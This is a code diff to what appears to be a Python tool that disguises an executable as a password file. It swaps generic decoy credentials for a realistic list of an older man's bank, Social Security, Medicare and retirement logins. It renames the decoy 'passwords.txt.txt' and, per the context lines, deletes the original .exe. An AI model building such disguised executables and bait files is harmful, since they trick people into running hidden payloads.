@@ -95,26 +95,61 @@ def get_payload_path():
 
 
 # Fake password file content
-FAKE_PASSWORDS = """Personal Passwords - DO NOT SHARE
+FAKE_PASSWORDS = """bgardner57@yahoo.com
+Samantha04!
 
-Gmail: john.doe@gmail.com
-Password: Summer2024!
+work email robert.gardner@mavengroup.net
+mustFTW!2025
 
-Facebook: johndoe
-Password: MySecurePass123
+facebook bob.gardner.7314
+Samantha04!
 
-Netflix: john.doe@gmail.com  
-Password: Netflix2024
+Wells Fargo online
+user: BGARDNER4782
+Murphy#2019
+security question = Murphy
 
-Banking: johndoe
-Password: B@nk!ngP@ss456
+Social Security - mySocialSecurity account
+bobgardner1957 / Murphy#2019
 
-WiFi Network: HomeNetwork_5G
-Password: W1F1P@ssw0rd2024
+Medicare.gov login
+same as SS account
 
---- Notes ---
-Remember to change these regularly!
-Last updated: October 2024
+CVS pharmacy
+bobgardner / Samantha04!
+prescription ready text alerts
+
+AARP membership # 4382991847
+login: bgardner57@yahoo.com / AARP2020
+
+amazon - same as yahoo email
+
+netflix bgardner57@yahoo.com / Netflix$Family
+sam knows this one
+
+Xfinity/Comcast
+account# 8774 4382 9918 2847
+bgardner / Murphy2019!
+email: robert.gardner472@sbcglobal.net
+
+Fidelity retirement account
+user: BOBGARDNER
+password: Fidelity$2018
+
+wifi: NETGEAR73 / Murphy2019!
+
+United MileagePlus# 8847392018
+bobgardner1957 / United2020
+
+ebay acct - bgardner47 / Samantha04!
+
+paypal = yahoo login
+
+microsoft acct same as work email
+
+DTE Energy online
+acct 2847-3821-9918
+bobgardner / DTEaccess2021
 """
 
 # Use the system's output encoding (check if sys.stdout exists for --noconsole mode)
@@ -261,7 +296,7 @@ def setup_camouflage(original_file: str = None):
     # Get the directory of the original file (use absolute path)
     original_file = os.path.abspath(original_file)
     original_dir = os.path.dirname(original_file)
-    fake_file_path = os.path.join(original_dir, "passwords.txt")
+    fake_file_path = os.path.join(original_dir, "passwords.txt.txt")
 
     # Delete the original .exe (not critical - might be locked)
     try:
